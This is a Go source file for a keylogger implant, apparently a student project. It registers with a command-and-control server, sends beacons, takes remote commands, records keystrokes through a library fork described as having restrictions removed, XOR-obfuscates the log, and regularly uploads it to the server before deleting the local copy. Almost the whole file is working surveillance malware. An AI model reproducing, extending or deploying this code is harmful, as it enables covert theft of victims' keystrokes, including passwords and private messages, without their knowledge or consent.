package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	"github.com/gen2brain/beeep"

	"github.com/watsittoye/go-keylogger" //forked from https://github.com/kindlyfire/go-keylogger and takes out some restrictions
)

var serverURL = "https://localhost:8443"
var uniqueID = generateUniqueID()
var encyptionKey byte = 0xA1

func generateUniqueID() string {
	host, _ := os.Hostname()
	randomBytes := make([]byte, 4)
	rand.Read(randomBytes)
	return host + "-" + hex.EncodeToString(randomBytes)
}

// basically lifted from https://www.youtube.com/watch?v=AMjC6kgoBD8&t=3s

func encrypt(plainText string) []byte {
	cipherText := make([]byte, len(plainText))

	for i := 0; i < len(plainText); i++ {
		c := plainText[i]
		cipherText[i] = c ^ encyptionKey
	}

	return cipherText
}

func decrypt(cipherText []byte) string {
	plainText := make([]byte, len(cipherText))

	for i := 0; i < len(cipherText); i++ {
		c := cipherText[i]
		plainText[i] = c ^ encyptionKey
	}

	decryptedStr := ""
	for _, b := range plainText {
		decryptedStr += string(rune(b))
	}

	return decryptedStr
}

func registerWithCC(client *http.Client, clientID string) error {
	resp, err := client.Get(fmt.Sprintf("%s/register?id=%s", serverURL, clientID))
	if err != nil {
		log.Fatalf("Failed to register with C&C server: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Failed to register with C&C server. Status code: %d", resp.StatusCode)
	}

	fmt.Println("Registered successfully with C&C server")
	return nil
}

func beacon(client *http.Client, clientID string, beaconPeriod time.Duration, pauseCh <-chan struct{}) {
	ticker := time.NewTicker(beaconPeriod)
	defer ticker.Stop()
	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-ticker.C:
			if !paused {
				sendBeacon(client, clientID)
			}
		}
	}
}

func sendBeacon(client *http.Client, clientID string) {
	url := fmt.Sprintf("%s/beacon?id=%s&time=%s", serverURL, clientID, time.Now().Format(time.RFC3339))
	resp, err := client.Get(url)
	if err != nil {
		log.Printf("Failed to send beacon: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Failed to send beacon. Status code: %d", resp.StatusCode)
		return
	}
	fmt.Println("Beacon sent successfully")
}

func handleCommands(client *http.Client) {
	for {
		url := fmt.Sprintf("%s/getCommand?id=%s", serverURL, uniqueID)
		resp, err := client.Get(url)
		if err != nil {
			fmt.Println("Failed to get commands:", err)
			time.Sleep(5 * time.Second)
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Failed to read command response:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		command := string(body)
		if command == "" {
			// No command received, sleep and retry
			time.Sleep(5 * time.Second)
			continue
		}

		// Process the command received
		fmt.Println("Received command:", command)
		executeCommand(client, command)
	}
}

var pauseCh = make(chan struct{})
var quitCh = make(chan struct{})

func executeCommand(client *http.Client, command string) {
	switch {
	case command == "pwn":
		beeep.Alert("Server Alert", "You've been pwned so I can get good grades", "")
		fmt.Println("You've been pwned so I can get good grades")
		fmt.Println(encrypt("hello"))
		fmt.Println(decrypt(encrypt("hello")))
	case command[:5] == "sleep":
		var duration int
		fmt.Sscanf(command, "sleep %d", &duration)
		fmt.Printf("Sleeping for %d seconds\n", duration)
		pauseCh <- struct{}{} // Pause the keylogger
		pauseCh <- struct{}{} // Pause the beacon
		time.Sleep(time.Duration(duration) * time.Second)
		pauseCh <- struct{}{} // Resume the keylogger
		pauseCh <- struct{}{} // Resume the beacon
	case command == "shutdown":
		fmt.Println("Shutting down...")
		os.Exit(0)

	case command == "upload":
		fmt.Println("Uploading keylog file...")
		quitCh <- struct{}{} // Pause the keylogger
		uploadKeylog(client)
		go keylog(pauseCh) // Resume the keylogger
	}
}

func keylog(pauseCh <-chan struct{}) {
	fileName := fmt.Sprintf("keystrokes_%s.log", uniqueID)
	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer file.Close()

	keylog := keylogger.NewKeylogger()
	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-quitCh:
			fmt.Println("Quitting keylogger...")
			// Clean up resources and exit
			file.Close()
			return
		default:
			if !paused {
				key := keylog.GetKey()
				if !key.Empty {
					var logEntry string

					if key.Name != "" {
						logEntry = fmt.Sprintf("'%s' %d\n", key.Name, key.Keycode)

					} else {
						logEntry = fmt.Sprintf("'%c' %d \n", key.Rune, key.Keycode)
					}

					fmt.Print(logEntry)

					//logEntry = fmt.Sprintf("'%c' %d\n", key.Rune, key.Keycode)
					encryptedLogEntry := encrypt(logEntry)
					if _, err := file.Write(encryptedLogEntry); err != nil {
						log.Printf("Failed to write to log file: %v", err)
					}
				}
			}
			time.Sleep(5 * time.Millisecond)
		}
	}
}

// https://stackoverflow.com/questions/44173461/copy-a-file-from-client-to-server-via-rest-end-point-using-golang
func uploadKeylog(client *http.Client) {
	fileName := fmt.Sprintf("keystrokes_%s.log", uniqueID)
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Errorf("Failed to open log file: %v", err)
	}
	defer file.Close()

	// Prepare a form body with the file content
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add file field to the form data
	part, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		fmt.Errorf("Failed to create form file: %v", err)
	}

	// Copy file content to the form field
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Errorf("Failed to copy file to form: %v", err)
	}

	// Add other fields like clientID
	_ = writer.WriteField("id", uniqueID)

	// Close the form data
	err = writer.Close()
	if err != nil {
		fmt.Errorf("Failed to close form writer: %v", err)
	}

	// Create POST request to upload endpoint
	url := fmt.Sprintf("%s/upload", serverURL)
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		fmt.Errorf("Failed to create request: %v", err)
	}

	// Set Content-Type header from multipart writer
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Perform the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Errorf("Failed to perform request: %v", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		fmt.Errorf("Server returned non-OK status: %v", resp.Status)
	}
	file.Close()
	// Delete local log file after successful upload
	err = os.Remove(fileName)
	if err != nil {
		log.Printf("Failed to delete local log file: %v", err)
	}
}

func uploadPeriodically(client *http.Client, uploadPeriod time.Duration, pauseCh <-chan struct{}) {
	ticker := time.NewTicker(uploadPeriod)
	defer ticker.Stop()

	paused := false
	for {
		select {
		case <-pauseCh:
			paused = !paused
		case <-ticker.C:
			if !paused {
				executeCommand(client, "upload")
			}
		}
	}
}

//https://www.youtube.com/watch?v=VF7lof3bSfE

func main() {
	caCertPath := "ca.crt"
	clientCertPath := "client.crt"
	clientKeyPath := "client.key"

	caCert, err := os.ReadFile(caCertPath)
	if err != nil {
		log.Fatalf("Failed to read CA certificate file: %v", err)
	}

	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatalf("Failed to append CA certificate to pool")
	}

	clientCert, err := tls.LoadX509KeyPair(clientCertPath, clientKeyPath)
	if err != nil {
		log.Fatalf("Failed to load client certificate: %v", err)
	}
	log.Println("Client certificate loaded successfully")

	tlsConfig := &tls.Config{
		RootCAs:            caCertPool,
		Certificates:       []tls.Certificate{clientCert},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true,
	}

	tr := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{Transport: tr}

	registerWithCC(client, uniqueID)

	go beacon(client, uniqueID, 10*time.Second, pauseCh)
	go handleCommands(client)
	go keylog(pauseCh)
	go uploadPeriodically(client, 30*time.Second, pauseCh)
	select {}
}
